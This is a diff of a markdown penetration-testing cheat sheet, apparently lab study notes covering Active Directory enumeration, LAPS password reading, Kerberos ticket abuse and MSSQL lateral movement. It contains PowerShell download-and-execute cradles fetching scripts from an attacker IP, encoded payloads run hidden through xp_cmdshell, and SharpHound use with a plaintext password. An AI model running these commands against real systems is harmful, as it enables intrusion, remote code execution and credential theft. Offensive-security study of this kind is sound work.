@@ -30,7 +30,7 @@ sekurlsa::tickets
 ```powershell
 rubeus.exe triage
 ```
-#### Operating System
+- Operating System
 ```powershell
 klist
 ```
@@ -413,7 +413,7 @@ Could in other name such as **bob.key**
 
 /home/bob/.ssh/id_rsa could be alice's private key
 
-known_host (Which you can access)
+- known_host (Which you can access)
 
 Servers that current user's private key can access. Could be hashed
 
@@ -573,18 +573,23 @@ Invoke-BloodHound -CollectionMethod All -Verbose
 SharpHound.exe -c All,GPOLocalGroup,LoggedOn --domain final.com --ldapusername nina --ldappassword 'PasswordRulon123!'
 
 ipmo .\adpeas.ps1
+
 Invoke-adPEAS
 ```
 ### LAPS
 
 - Check LAPS
 ```powershell
-iex(new-object system.net.webclient).downloadstring('http://192.168.x.y/tools/hostrecon.ps1')
-invoke-hostrecon
+ipmo powerview.ps1
+
+get-netcomputer -Filter "(ms-mcs-admpwdexpirationtime=*)" | select dnshostname
+
 ```
 - Read Password
 ```powershell
-Get-ADObject -Name web05 -DomainController 192.168.y.z -Properties ms-mcs-admpwd
+ipmo powerview.ps1
+
+get-netcomputer -Filter "(ms-mcs-admpwd=*)" | select dnshostname,ms-mcs-admpwd
 ```
 ### AppLocker
 
@@ -713,15 +718,15 @@ get-sqlquery -instance "web06\sqlexpress" -query "exec ('sp_configure ''show adv
 ```bash
 echo -en 'IEX ((new-object net.webclient).downloadstring("http://10.10.14.111/runner64.txt"))' | iconv -t UTF-16LE | base64 -w 0 (Encode Payload)
 
-exec xp_cmdshell 'powershell -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgAxADEAMQAvAHIAdQBuAG4AZQByADYANAAuAHQAeAB0ACIAKQApAA==' (SQL Query)
+exec xp_cmdshell 'powershell -w hidden -enc <...>' (SQL Query)
 
-Invoke-SQLOSCmd -Instance "CYWEBDW\SQLEXPRESS" -Command "powershell -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgAxADEAMQAvAHIAdQBuAG4AZQByADYANAAuAHQAeAB0ACIAKQApAA== " -RawResults  (PowerUpSQL Query 1)
+Invoke-SQLOSCmd -Instance "CYWEBDW\SQLEXPRESS" -Command "powershell -w hidden -enc <...> " -RawResults  (PowerUpSQL Query 1)
 
-get-sqlquery -instance "CYWEBDW\SQLEXPRESS" -query "EXEC('xp_cmdshell ''powershell -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgAxADEAMQAvAHIAdQBuAG4AZQByADYANAAuAHQAeAB0ACIAKQApAA== '' ; ' ) " (PowerUpSQL Query 2)
+get-sqlquery -instance "CYWEBDW\SQLEXPRESS" -query "EXEC('xp_cmdshell ''powershell -w hidden -enc <...> '' ; ' ) " (PowerUpSQL Query 2)
 
-get-sqlquery -instance "CYWEBDW\SQLEXPRESS" -query "EXEC('xp_cmdshell ''powershell -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgAxADEAMQAvAHIAdQBuAG4AZQByADYANAAuAHQAeAB0ACIAKQApAA== '' ; ' )AT [m3sqlw.red.local]" (1 hop PowerUpSQL query)
+get-sqlquery -instance "CYWEBDW\SQLEXPRESS" -query "EXEC('xp_cmdshell ''powershell -w hidden -enc <...> '' ; ' )AT [m3sqlw.red.local]" (1 hop PowerUpSQL query)
 ````
-- Enable rpcout
+- Enable Rpcout
 ```sql
 execute as login='sa'; exec sp_serveroption 'sql03', 'rpc out', 'true'; (SQL Query)
 
@@ -990,7 +995,7 @@ rubeus.exe asktgs /service:cifs/bluedc.blue.com/domain:bluedc.blue.com /dc:blued
 
 echo '[ticket]' | grep base64 -d > red.kirbi
 
-ls [\\bluedc.blue.com\c$](file://bluedc.blue.com/c$)
+ls \\bluedc.blue.com\c$
 ```
 ### Bidirectional Trust Between Forests
 
